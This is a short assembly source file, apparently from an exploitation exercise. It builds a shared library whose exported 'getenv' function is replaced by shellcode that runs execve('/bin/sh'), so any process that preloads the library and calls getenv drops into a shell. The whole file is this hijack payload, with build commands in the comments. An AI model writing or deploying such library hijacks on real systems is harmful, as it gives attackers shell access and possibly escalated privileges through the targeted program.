; nasm -f elf64 hook.S -o hook.o && ld --shared hook.o -o hook.so
; ubuntu 16.04 GNU ld (GNU Binutils for Ubuntu) 2.26.1
[BITS 64]
	global getenv:function
	section .text
getenv:
	mov rax, 0x68732f6e69622f
	push rax
	mov rdi, rsp
	xor esi, esi
	push 0x3b
	pop rax
	cdq
	syscall